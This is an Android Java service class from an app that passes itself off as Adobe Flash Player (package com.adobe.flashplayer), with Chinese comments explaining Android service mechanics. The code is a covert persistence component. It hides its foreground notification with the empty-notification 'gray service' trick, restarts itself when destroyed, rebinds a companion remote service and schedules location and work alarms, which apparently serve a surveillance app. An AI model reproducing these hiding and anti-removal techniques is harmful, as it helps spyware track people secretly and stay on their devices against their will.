package com.adobe.flashplayer.core;


import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Binder;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.adobe.flashplayer.MainActivity;
import com.adobe.flashplayer.MainEntry;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.ISvcAidlInterface;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.account.AccountActivity;
import com.adobe.flashplayer.core.CoreHelper;
import com.adobe.flashplayer.data.UploadRemainder;


public class ForegroundSrv extends Service{
    private static final String TAG = "[ljg]ForegroundSrv ";

    public static final int GRAY_SERVICE_ID = 0x12345678;
    ForegroundSrvBinder foreBinder 	= null;
    RemoteSrv.RemoteSrvBinder remoteBinder = null;
    ForegroundSrvConn conn		= null;
    Context context = null;


    @Override
    public IBinder onBind(Intent intent) {
        //WriteDateFile.writeLogFile("ForegroundService onBind\r\n");
        //System.out.println("ForegroundService onBind\r\n");
        //Log.e(TAG, "onBind");
        return foreBinder;
    }

    //客户端通过调用 bindService() 绑定到服务。
    // 调用时，它必须提供 ServiceConnection 的实现，后者会监控与服务的连接。bindService() 的返回值指示所请求的服务是否存在，以及是否允许客户端访问该服务。
    // Android 系统创建客户端与服务之间的连接时，会对 ServiceConnection 调用 onServiceConnected()。
    // onServiceConnected() 方法包含一个 IBinder 参数，客户端随后会使用该参数与绑定服务通信。
    //当最后一个客户端取消与服务的绑定时，系统会销毁该服务
    @Override
    public boolean onUnbind(Intent intent) {
        //Log.e(TAG, "onUnbind");
        //WriteDateFile.writeLogFile("ForegroundService onUnbind\r\n");
        //System.out.println("ForegroundService onUnbind\r\n");
        return super.onUnbind(intent);
    }


    @Override
    public void onCreate() {

        super.onCreate();

        context = getApplicationContext();

        foreBinder = new ForegroundSrvBinder();

        conn = new ForegroundSrvConn();

        Intent intentremote = new Intent(context,RemoteSrv.class);
        intentremote.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //startService(intentremote);

        CoreHelper.launchRemoteService(context);

        boolean ret = bindService(intentremote, conn, Context.BIND_IMPORTANT);

        Log.e(TAG, "onCreate bindService:" + String.valueOf(ret));

        MyLog.writeLogFile(TAG + "onCreate bindService:" + String.valueOf(ret) + "\r\n");

        if (Build.VERSION.SDK_INT < 18) {
            //API < 18 此方法能有效隐藏Notification上的图标
            startForeground(GRAY_SERVICE_ID, new Notification());
        }
        else if (Build.VERSION.SDK_INT >= 18 && Build.VERSION.SDK_INT < 24) {
            Intent innerIntent = new Intent(context, GrayInnerSrv.class);
            innerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startService(innerIntent);
        }else{
            ;	//do nothing above android 7.0
        }


        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = CoreHelper.createNotificationChannel(this.getClass().getSimpleName(), this.getClass().getSimpleName(),context);
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId);
            Notification notification = builder.setOngoing(true)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setPriority(1)
                    .setCategory(Notification.CATEGORY_SERVICE)
                    .build();
            startForeground(GRAY_SERVICE_ID, notification);
        } else {
            //前台服务，优先级和前台应用一个级别，除非在系统内存非常缺，否则此进程不会被 kill
            startForeground(GRAY_SERVICE_ID, new Notification());
        }

        return;
    }


    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        //WriteDateFile.writeLogFile("ForegroundService onstart\r\n");
        //Log.e(TAG, "onStart");
        //System.out.println("ForegroundService onstart\r\n");
    }

    //Service运行在主线程里的，如果你在Service里编写了非常耗时的代码，程序必定会出现ANR的
    //flags:0, START_FLAG_REDELIVERY, or START_FLAG_RETRY(start_sticky)
    //startid is times of service start
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        int retcode = super.onStartCommand(intent, flags, startId);

        Log.e(TAG, "super onStartCommand:" + retcode);

        try{
            CoreHelper.launchJobDeamonService(context);

            String install = PrefOper.getValue(context, Public.PARAMCONFIG_FileName,Public.UNINSTALLFLAG);
            if(install != null && install.equals("true")){
                return START_NOT_STICKY;
            }

            Broadcast.registryBroadcast(context);

            CoreHelper.launchWorkThread(context);

            CoreHelper.scheduleWorkAlarm(context);

            CoreHelper.scheduleLocationAlarm(context);

        }
        catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile(TAG+"onStartCommand exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
        return START_STICKY;
    }


    @Override
    public void onDestroy() {
        super.onDestroy();

        Intent intentSelf = new Intent(ForegroundSrv.this, ForegroundSrv.class);
        intentSelf.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startService(intentSelf);

        Intent intent = new Intent(ForegroundSrv.this, RemoteSrv.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        //startService(intent);
        CoreHelper.launchRemoteService(context);

        boolean ret = bindService(intent, conn, Context.BIND_IMPORTANT);

        MyLog.writeLogFile(TAG+"onDestroy bindService:" + String.valueOf(ret) + "\r\n");
        Log.e(TAG, "onDestroy bindService:" + String.valueOf(ret));
    }



    /*
    if without aidl,then the ibinder must be like that below:

    class ForegroundSrvBinder extends Binder{

        public String getServiceName() throws RemoteException {
            return ForegroundSrv.class.getSimpleName();
        }
    }
     */

    public static class ForegroundSrvBinder extends ISvcAidlInterface.Stub {
        @Override
        public String getServiceName() throws RemoteException {
            return ForegroundSrv.class.getSimpleName();
        }
    }



    class ForegroundSrvConn implements ServiceConnection {

        public static final String TAG = "[ljg]ForegroundSrvConn ";

        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            //（1）如果不指定android:process，直接在主进程中启动service，由于在同一个进程内，对象可以直接传递，所以返回了我们自己定义Binder对象。这个强转就是没有问题的
            //（2）如果指定了android:process，由跨进程通信，不能直接对象，传递的是代理对象，此时就出现了类型错误。
            ISvcAidlInterface proxy = ISvcAidlInterface.Stub.asInterface(service);
            //remoteBinder = (RemoteSrv.RemoteSrvBinder)remoteBinder;
            try{
                Log.e(TAG, "run service method result:"  + proxy.getServiceName());

            }catch (Exception e){
                e.printStackTrace();
            }

            Log.e(TAG, "onServiceConnected:"  + name);
        }

        //client和Service解除绑定时，onServiceDisconnected并不会被调用；
        // onServiceDisconnected被调用的情况是发生在client和Service连接意外丢失时，这时client和Service一定是断开连接了。
        //在托管服务的进程崩溃或被杀死时。
        // 这并不会移除ServiceConnection本身——这个与服务的绑定将保持活动状态，当服务下次运行时，您将收到对onserviceconnconnected (ComponentName, IBinder)的调用。
        // 而在onServiceConnected方法中，通过向下转型，获取到了service实例，后续的方法中会使用service实例来使用service中定义的公共方法。
        //需要注意的是，onServiceDisconnected() 和onServiceConnected (ComponentName name, IBinder service) 这两个方法均是在bindservice() 方法调用之后触发。

        @Override
        public void onServiceDisconnected(ComponentName name) {

            Intent intent = new Intent(ForegroundSrv.this, RemoteSrv.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            //ForegroundSrv.this.startService(intent);
            CoreHelper.launchRemoteService(context);
            //bindService方法的返回值是一个布尔类型的值， 如果系统正在启动客户端有权限绑定的服务，则为True;如果系统无法找到该服务，或者如果您的客户端没有绑定该服务的权限，则为False。
            boolean ret = bindService(intent, conn, Context.BIND_IMPORTANT);

            MyLog.writeLogFile(TAG + "onServiceDisconnected:" + name + " result:" + String.valueOf(ret)+"\r\n");

            Log.e(TAG,"onServiceDisconnected:" + name + " result:" + String.valueOf(ret));
        }
    }


    //inner class must be public static
    public static class GrayInnerSrv extends Service {

        private static final String TAG = "[ljg]GrayInnerSrv ";

        @Override
        public void onCreate() {
            Log.e(TAG,"onCreate");
            MyLog.writeLogFile(TAG+" onCreate\r\n");
            super.onCreate();
        }

        @Override
        public void onStart(Intent intent, int startId) {
            super.onStart(intent, startId);

            MyLog.writeLogFile(TAG+" onstart\r\n");
            Log.d(TAG, "onStart");
            //System.out.println("service onstart\r\n");
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            Log.e(TAG,"onStartCommand");
            MyLog.writeLogFile(TAG+"onStartCommand\r\n");

            startForeground(GRAY_SERVICE_ID+1, new Notification());
            //stopForeground(true);
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }

        @Override
        public IBinder onBind(Intent intent) {
            MyLog.writeLogFile(TAG +" onBind\r\n");

            Log.e(TAG,"onBind");

            //throw new UnsupportedOperationException("GrayInnerService onBind exception");
            return null;
        }

        @Override
        public void onDestroy() {
            super.onDestroy();

            MyLog.writeLogFile(TAG + "onDestroy\r\n");

            Log.e(TAG,"onDestroy");
        }
    }



}





